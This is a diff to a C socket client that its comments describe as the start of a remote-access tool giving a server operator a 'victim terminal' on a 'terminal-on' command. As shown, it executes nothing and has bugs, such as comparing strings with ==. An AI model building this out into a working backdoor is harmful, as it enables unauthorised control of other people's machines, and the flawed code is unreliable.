@@ -13,12 +13,15 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <stdbool.h>
 
 int start()
 {
   int sock;
   struct sockaddr_in server;
-  char message[1000] , server_reply[2048];
+  char message[1000], server_reply[2048];
+  char terminal_command[40] = "terminal-on";
+  bool terminal = false;
 
   /* To actually start the client, we have to create
    * a socket using socket() and then connect it to the 
@@ -38,24 +41,45 @@ int start()
     printf("[E]: Can't connect to the server...\n");
     return 1;
   }
-  
+  printf("Socket connected to the server...\n"); 
   while(1)
   {
+    printf("1 %s:\n", server_reply);
+    server_reply[0] = '\0';
+    printf("2 %s:\n", server_reply);
+    strcpy(message, "Message recived at client...\n");
     if (recv(sock, server_reply, 2000, 0) < 0)
     {
-      printf("[E]: Fatal, can't recive the msg from the server");
+      printf("[E]: Fatal, can't recive the msg from the server\n");
       break;
     }
-    printf("[SERVER]: %s\n", server_reply);
-    // Send a confirmation from the client to the server
-    char message[] = "Reply recived at client";
+    printf("3 %s:\n", server_reply);
+    printf("[S]: %s\n", server_reply);
+    /* If the user wants to enter the victim terminal it has
+     * to type the command 'terminal-on'. Then the program will
+     * check if it already has access to the terminal, if the server
+     * doesn't it will change the terminal boolean flag. 
+     * */
+    if (server_reply == terminal_command) 
+    {
+      if (terminal)
+      {
+        // If the terminal mode was already on, inform the user
+        strcpy(message, "Terminal mode was already turned on...");
+      } else
+      {
+        terminal = true;
+        strcpy(message, "Now you have access to the system terminal...");
+      }
+      continue;
+    }
+    // Send a confirmation from the client to the server 
     if (send(sock , message , strlen(message) , 0) < 0)
     {
       printf("[E]: Can't send a message to the server");
       return 1;
     }
-  }
-  
+  } 
   close(sock);
   return 0;
 }
